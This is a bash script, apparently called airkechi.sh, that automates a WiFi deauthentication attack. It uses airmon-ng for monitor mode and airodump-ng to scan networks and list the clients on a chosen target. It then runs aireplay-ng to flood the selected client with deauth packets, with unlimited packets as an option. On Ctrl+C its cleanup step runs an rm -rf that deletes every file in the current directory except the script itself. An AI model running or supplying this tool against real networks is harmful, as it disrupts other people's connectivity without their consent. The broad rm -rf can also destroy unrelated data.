#!/bin/bash


if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root!"
  exit 1
fi

echo "Your active WiFi interfaces:"
ip a | grep 'state UP' -B2 | grep -E 'wlan|wl'

read -p "Enter your WiFi interface (e.g., wlan1): " interface

echo "[*] Trying to enable monitor mode..."
airmon-ng start "$interface"
mon_interface="${interface}mon"

echo "[*] Monitor mode interface: $mon_interface"

echo "You can stop the next scan anytime by pressing CTRL+C."
echo "[*] Scanning nearby WiFi networks... (Press CTRL+C to stop)"
airodump-ng "$mon_interface"

read -p "Enter target network's BSSID: " bssid
read -p "Enter target network's channel: " channel
read -p "Enter number of deauth packets (0 = unlimited, e.g., 10): " deauth

echo "[*] Scanning devices connected to target network... (Press CTRL+C to stop)"
airodump-ng -c "$channel" --bssid "$bssid" -w targets "$mon_interface"

if [ ! -f targets-01.csv ]; then
  echo "[!] Error: targets-01.csv file not found. Something went wrong."
  exit 1
fi

grep Station targets-01.csv -A 1000 | tail -n +2 | awk -F',' '{print $1}' | grep -v '^$' > macs.txt

if [ ! -s macs.txt ]; then
  echo "[!] No connected clients found on the target network."
  exit 1
fi

echo "[*] Connected clients found:"
cat macs.txt

read -p "Enter target client MAC address to attack (from above list): " target_mac

cleanup() {
  echo ""
  echo "[*] CTRL+C detected. Cleaning up..."

  airmon-ng stop "$mon_interface" >/dev/null 2>&1

  echo "[*] Removing temporary files except airkechi.sh..."
  find . -maxdepth 1 ! -name 'airkechi.sh' ! -name '.' -exec rm -rf {} +

  echo "[✓] Cleanup complete!"
  exit 0
}

trap cleanup SIGINT

echo "[*] Starting deauth attack on $target_mac... Press CTRL+C to stop."
aireplay-ng --deauth "$deauth" -a "$bssid" -c "$target_mac" "$mon_interface"
